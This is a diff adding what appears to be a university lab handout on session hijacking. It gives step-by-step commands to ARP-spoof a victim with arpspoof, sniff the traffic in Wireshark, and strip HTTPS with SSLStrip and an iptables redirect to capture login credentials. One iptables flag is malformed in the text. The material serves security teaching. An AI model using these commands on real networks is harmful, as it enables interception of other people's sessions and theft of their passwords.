@@ -1,0 +1,35 @@
+Session	Hijacking
+
+Objectives:
+perform	a	Man-in-the-Middle	Attack
+intercept	 traffic	 from	a	person	who	browse	 trough	HTTP	and	obtain	session	cookies	and	
+taking	over	victim's	session
+intercept	 traffic	 made	 trough	 HTTPS;	 obtaining	 username	 and	 password	 - taking	 over	
+victim's	password.
+You	need	two	computers:
+host	computer
+Kali	 Linux	 virtual	 machine	 with	 network	 interface	 in	 bridge	 mode	
+(http://www.offensive-security.com/kali-linux-vmware-arm-image-download/ )
+Exercise	1:
+On	the	attacker's	machine
+Intercept	traffic	trough	Man-in-The	middle	attack:
+1. Find	out	gateway’s	IP	(netstat	–r)
+2. Find	out	Victim's	IP	Address.
+www.ituniversity.ro 2014
+3. Activate	routing	process	on	Kali	VM:	echo	1	>	/proc/sys/net/ipv4/ip_forward
+4. Poison	 victim's	 ARP	 table	 to	 think	 that	 the	 gateway's	 MAC	 Address	 is	 the	
+Attacker's	address:	arpspoof –i	eth0 –t	IP_Victima	IP_Gateway
+5. Open	wireshark	and	see	victim's	traffic.
+Exercise	2:
+Intercept	traffic	made	by	victim	over	HTTPS
+1. Become	Man	in	the	Middle	(as	in	exercise	nr.1)
+2. Start	 SSLStrip	 to	 listen	 on	 port	 1234:	sslstrip –l	 1234 –s –w	 traffic.log (more	
+details:	http://www.thoughtcrime.org/software/sslstrip/ )
+3. Configure	IPTables	to	redirect	Traffic	over	HTTP	to	SSLStrip:	iptables	-t	nat	-A	PREROUTING	-
+p	tcp --destinationport	80	-j	REDIRECT	--to-port	1234
+4. In	victim's	computer	browser,	visit	and	login	to	a	HTTPS	web	server	(such	as:	Yahoo)
+5. Extract	information	from	traffic.log
+
+
+
+https://d2vvqscadf4c1f.cloudfront.net/PFiWvKzCREiQL6LvZ7kk_2015-08-18_01-25-49__SSLStrip.pdf
